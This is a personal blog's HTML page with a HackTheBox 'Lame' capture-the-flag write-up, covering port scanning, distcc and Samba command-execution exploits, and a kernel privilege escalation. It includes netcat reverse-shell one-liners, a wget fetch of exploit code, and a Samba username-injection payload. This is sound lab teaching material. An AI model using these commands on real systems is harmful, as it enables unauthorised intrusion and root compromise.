@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Sulejman Bijedic">
+    <meta name="description" content="Write-ups about Linux and Security">
+    <meta name="keywords" content="blog,security,linux">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Lame"/>
+<meta name="twitter:description" content="Machine info  OS : Linux Difficulty : Easy Points : 20 IP : 10.10.10.3  Mind Map Reconnaisance First of all, let&rsquo;s conduct a scan in order to check what ports are open:
+sudo nmap -A -T4 10.10.10.3 -n -oA ./nmap  where -A stands for &lsquo;Enable OS detection, version detection, script scanning, and traceroute&rsquo; where -T4 is for setting the timing template (available from 0 to 5) where -n stands for &lsquo;Never do DNS resolution&rsquo; where -oA stands for &lsquo;Output in the three major formats at once&rsquo;  Here&rsquo;s the scan result:"/>
+
+    <meta property="og:title" content="Lame" />
+<meta property="og:description" content="Machine info  OS : Linux Difficulty : Easy Points : 20 IP : 10.10.10.3  Mind Map Reconnaisance First of all, let&rsquo;s conduct a scan in order to check what ports are open:
+sudo nmap -A -T4 10.10.10.3 -n -oA ./nmap  where -A stands for &lsquo;Enable OS detection, version detection, script scanning, and traceroute&rsquo; where -T4 is for setting the timing template (available from 0 to 5) where -n stands for &lsquo;Never do DNS resolution&rsquo; where -oA stands for &lsquo;Output in the three major formats at once&rsquo;  Here&rsquo;s the scan result:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/hackthebox/lame/" />
+<meta property="article:published_time" content="2020-06-14T16:04:02+01:00" />
+<meta property="article:modified_time" content="2020-06-14T16:04:02+01:00" />
+
+
+    
+      <base href="/posts/hackthebox/lame/">
+    
+    <title>
+  Lame · lafx0
+</title>
+
+    
+      <link rel="canonical" href="/posts/hackthebox/lame/">
+    
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.2/css/all.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.a4f332213a21ce8eb521670c614470c58923aaaf385e2a73982c31dd7642decb.css" integrity="sha256-pPMyITohzo61IWcMYURwxYkjqq84XipzmCwx3XZC3ss=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+      <link rel="stylesheet" href="/css/custom.css" />
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+    <meta name="generator" content="Hugo 0.66.0" />
+  </head>
+
+  
+  
+  <body class="colorscheme-light">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      lafx0
+    </a>
+    
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/posts/">Blog</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/about/info/">About</a>
+          </li>
+        
+      
+      
+    </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Lame</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fas fa-calendar"></i>
+              <time datetime='2020-06-14T16:04:02&#43;01:00'>
+                June 14, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fas fa-clock"></i>
+              9-minute read
+            </span>
+          </div>
+          
+          
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="machine-info">Machine info</h1>
+<ul>
+<li>OS : Linux</li>
+<li>Difficulty : Easy</li>
+<li>Points : 20</li>
+<li>IP : 10.10.10.3</li>
+</ul>
+<h1 id="mind-map">Mind Map</h1>
+<p><img src="/images/htb/lame_mindmap.png" alt="Lame_MindMap"></p>
+<h1 id="reconnaisance">Reconnaisance</h1>
+<p>First of all, let&rsquo;s conduct a scan in order to check what ports are open:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -A -T4 10.10.10.3 -n -oA ./nmap</code></pre></div>
+<ul>
+<li>where <code>-A</code> stands for &lsquo;Enable OS detection, version detection, script scanning, and traceroute&rsquo;</li>
+<li>where <code>-T4</code> is for setting the timing template (available from 0 to 5)</li>
+<li>where <code>-n</code> stands for &lsquo;Never do DNS resolution&rsquo;</li>
+<li>where <code>-oA</code> stands for &lsquo;Output in the three major formats at once&rsquo;</li>
+</ul>
+<p>Here&rsquo;s the scan result:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">Nmap scan report for 10.10.10.3
+Host is up (0.31s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.10.14.18
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey:
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.18 (92%), Dell Chassis Management Controller (CMC) (92%), D-Link DIR-300 NRU router (Linux 2.6.21) (92%), Linux 2.6.16 - 2.6.21 (92%), Linux 2.6.18 - 2.6.27 (92%), Linux 2.6.21 (92%), Linux 2.6.26 (92%), Linux 2.6.8 - 2.6.30 (92%), Meinberg LANTIME M600 NTP server (Linux 2.6.15) (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -3d00h57m10s, deviation: 2h49m43s, median: -3d02h57m11s
+| smb-os-discovery:
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name:
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2020-06-12T06:29:05-04:00
+| smb-security-mode:
+|   account_used: blank
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+TRACEROUTE (using port 22/tcp)
+HOP RTT       ADDRESS
+1   323.34 ms 10.10.14.1
+2   323.88 ms 10.10.10.3</code></pre></div>
+<p><strong>Note:</strong> The Samba version is <strong>3.0.20-Debian</strong>. I&rsquo;ll note that down for further research of possible known exploits.</p>
+<p>I&rsquo;ve discovered some open ports but before moving on let&rsquo;s also conduct a <strong>full port scan</strong>, just to be sure that I do not miss nothing behind:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sS -sV -p- 10.10.10.3 -n</code></pre></div>
+<p><strong>By default nmap will only scan the top ports. To scan all the ports, I have to include the -p- switch.</strong></p>
+<p>Here&rsquo;s the scan result:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">Nmap scan report for 10.10.10.3
+Host is up (0.082s latency).
+Not shown: 65530 filtered ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+<p>I have discovered a new open port -&gt; <strong>3632</strong>.</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>At this point I can conduct a <strong>vulnerability scan against those ports</strong> in order to check if there are some well known vulnerabilities affecting their running services and also search for <strong>available exploits for Samba version 3.0.20-Debian</strong> (noted before).</p>
+<h3 id="1-vulnerability-scan-against-ports-21-22-139-445-and-3632">1. Vulnerability Scan against ports 21, 22, 139, 445 and 3632</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">3632/tcp open  distccd
+| distcc-cve2004-2687:
+|   VULNERABLE:
+|   distcc Daemon Command Execution
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2004-2687
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+|       earlier. The vulnerability is the consequence of weak service configuration.
+|       
+|     Disclosure date: 2002-02-01
+|     Extra information:
+|       
+|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
+|   
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
+|       https://distcc.github.io/security.html
+|_      https://nvd.nist.gov/vuln/detail/CVE-2004-2687</code></pre></div>
+<p>Great! The <em>distcc</em> service running on port 3632 seems vulnerable to <strong>CVE-2004-2687</strong>.</p>
+<blockquote>
+<p>distcc 2.x, as used in XCode 1.5 and others, when not configured to restrict access to the server port, allows remote attackers to
+execute arbitrary commands via compilation jobs, which are executed by the server without authorization checks.</p>
+</blockquote>
+<p>After some googling I found that nmap has a script that exploits the vulnerability: <strong>distcc-cve2004-2687</strong>.</p>
+<h3 id="2-check-exploits-for-samba-3020-debian">2. Check exploits for Samba 3.0.20-Debian</h3>
+<p>Apparently, the aforementioned Samba version seems to be vulnerable to <strong>CVE2007-2447</strong>.
+Let&rsquo;s see what is this exploit about:</p>
+<blockquote>
+<p>By sending shell metacharacters into the username we trigger the bug which in turn allows us to send arbitrary commands to the device through the username field when attempting an SMB connection. As we mentioned earlier, no authentication is required to exploit this due to the fact that the option is used to map usernames prior to authentication and thus we can exploit this whilst being unauthenticated.</p>
+</blockquote>
+<p><strong>Note</strong>: shell metacharacters are special characters that the shell interprets rather than passing to the command.</p>
+<p>At this point It seems I have two possible ways of rooting the machine:</p>
+<p><strong>1</strong>. exploiting the <em>distcc</em> service</p>
+<p><strong>2</strong>. exploiting Samba</p>
+<p>I&rsquo;ll cover both ways.</p>
+<h1 id="exploitation">Exploitation</h1>
+<h3 id="1-distcc-service">1. distcc Service</h3>
+<p>First of all I have to launch a listener on my machine:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nc -lvp 4445
+listening on [any] 4445 ...</code></pre></div>
+<p>Next, in another terminal window I have to launch the nmap script with its arguments:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo nmap --script distcc-cve2004-2687 --script-args=&#34;distcc-cve2004-2687.cmd=&#39;nc -nv 10.10.14.18 4445 -e /bin/bash&#39;&#34; -p 3632 10.10.10.3</code></pre></div>
+<p>After a few moments, I will receive back a connection on my netcat listener:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">10.10.10.3: inverse host lookup failed: Unknown host
+connect to [10.10.14.18] from (UNKNOWN) [10.10.10.3] 49826
+python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+daemon@lame:/tmp$</code></pre></div>
+<p><strong>Note</strong>: I have imported a python shell.</p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>I am not root, so I have to figure out how to obtain full access on the machine. If I run <em>uname -a</em> I can see that the kernel version is <strong>2.6.24</strong>. There are different privilege escalation scripts available for this kernel version, here I&rsquo;ll chose this one:
+<a href="https://www.exploit-db.com/exploits/8572">https://www.exploit-db.com/exploits/8572</a></p>
+<p>I download it on my machine and serve it to the target machine, where I will compile it since I know the target machine has a compiler installed:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">daemon@lame:/tmp$ gcc --version
+gcc --version
+gcc (GCC) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)
+Copyright (C) 2007 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</code></pre></div>
+<p>I set up a python server on my machine:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo python -m SimpleHTTPServer 8080
+Serving HTTP on 0.0.0.0 port 8080 ...</code></pre></div>
+<p>And download the file from the target:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">daemon@lame:/tmp$ wget http://10.10.14.18:8080/exploit.c
+wget http://10.10.14.18:8080/exploit.c
+--09:24:13--  http://10.10.14.18:8080/exploit.c
+           =&gt; `exploit.c&#39;
+Connecting to 10.10.14.18:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2,781 (2.7K) [text/plain]
+
+100%[====================================&gt;] 2,781         --.--K/s             
+
+09:24:13 (339.80 MB/s) - `exploit.c&#39; saved [2781/2781]</code></pre></div>
+<p>Now I have to compile it and read the usage instructions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">daemon@lame:/tmp$ gcc exploit.c -o exploit
+gcc exploit.c -o exploit</code></pre></div>
+<p>Instructions:</p>
+<blockquote>
+<p>Pass the PID of the udevd netlink socket (listed in /proc/net/netlink,
+usually is the udevd PID minus 1) as argv[1].
+The exploit will execute /tmp/run as root so throw whatever payload you
+want in there.</p>
+</blockquote>
+<p>So, for the exploit to work I have to find the PID of the <strong>udevd netlink socket</strong> and place any payload I want under <strong>/tmp/run</strong> and it will be executed as root!</p>
+<p>To find the PID:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">daemon@lame:/tmp$ cat /proc/net/netlink
+cat /proc/net/netlink
+sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
+ddf0c800 0   0      00000000 0        0        00000000 2
+df7a1400 4   0      00000000 0        0        00000000 2
+dd30b800 7   0      00000000 0        0        00000000 2
+dd826600 9   0      00000000 0        0        00000000 2
+dd82e400 10  0      00000000 0        0        00000000 2
+ddf0cc00 15  0      00000000 0        0        00000000 2
+dcc2ba00 15  2687   00000001 0        0        00000000 2
+ddf15800 16  0      00000000 0        0        00000000 2
+df5dc400 18  0      00000000 0        0        00000000 2</code></pre></div></p>
+<p>I create a reverse shell in a file called <em>run</em> under /tmp:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">daemon@lame:/tmp$ echo &#39;#!/bin/bash&#39; &gt; run
+echo &#39;#!/bin/bash&#39; &gt; run
+daemon@lame:/tmp$ echo &#39;nc -nv 10.10.14.18 4446 -e /bin/bash&#39; &gt;&gt; run
+echo &#39;nc -nv 10.10.14.18 4446 -e /bin/bash&#39; &gt;&gt; run</code></pre></div>
+<p>Now, before launching the exploit, I have to set up a listener on my machine:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nc -nlvp 4446
+listening on [any] 4446 ...</code></pre></div>
+<p>I launch the exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">daemon@lame:/tmp$ ./exploit 2687
+./exploit 2687</code></pre></div>
+<p>After a few seconds, I&rsquo;ll have a connection back on my listener. I am now root!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">connect to [10.10.14.18] from (UNKNOWN) [10.10.10.3] 36182
+whoami
+root
+python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+root@lame:/#</code></pre></div>
+<p><strong>Note</strong>: flags are under /home and /root</p>
+<h3 id="2-samba-version-3020-debian">2. Samba version 3.0.20-Debian</h3>
+<p>I can also exploit this vulnerability with Metasploit, but since the process is very simple I will do it manually.</p>
+<p>I set up a listener on my machine:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nc -nlvp 4447                                                                                                                                                 
+listening on [any] 4447 ...</code></pre></div>
+<p>Now I have to list the victim SMB shares - I know I can do that from the Recon phase because the message-signing is disabled - and see if I have access somewhere where to put a reverse shell:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">smbclient -L 10.10.10.3
+Enter WORKGROUP\lafxo&#39;s password:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk      
+        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
+        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
+Reconnecting with SMB1 for workgroup listing.
+Anonymous login successful
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            LAME</code></pre></div>
+<p>To see permissions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo smbmap -H 10.10.10.3
+[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        tmp                                                     READ, WRITE     oh noes!
+        opt                                                     NO ACCESS
+        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))</code></pre></div>
+<p>I have <strong>WRITE permissions on tmp</strong>, so let&rsquo;s access it and see If I can put here my reverse shell:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">smbclient \\\\10.10.10.3\\tmp
+Enter WORKGROUP\lafxo&#39;s password:
+Anonymous login successful
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; logon &#34;/=`nohup nc -nv 10.10.14.18 4447 -e /bin/sh`&#34;
+Password:</code></pre></div>
+<p>After a few seconds, I receive the reverse shell on my listener, and I can see I&rsquo;m already root!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">connect to [10.10.14.18] from (UNKNOWN) [10.10.10.3]
+39442                                                                                                                    
+whoami
+root</code></pre></div>
+<h2 id="lessons-learned-and-remediations">Lessons learned and remediations</h2>
+<ul>
+<li>Whenever possible run a full port scan. With the default port scan it was impossible to identify the port 3632, which leaded to exploitation!</li>
+<li>The machine was exploited thanks to publicly available exploits. So always update the software!</li>
+<li>Restrict access to the server by disabling WRITE access where not necessary, as it could easily become a way for exploitation.</li>
+</ul>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ['$', '$'], ['\\(', '\\)']
+        ],
+        processEscapes: true,
+        processEnvironments: true
+      },
+      options: {
+        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+      }
+    };
+  </script>
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    
+      <p>'  '</p>
+    
+    
+    
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+
+    
+
+  </body>
+
+</html>
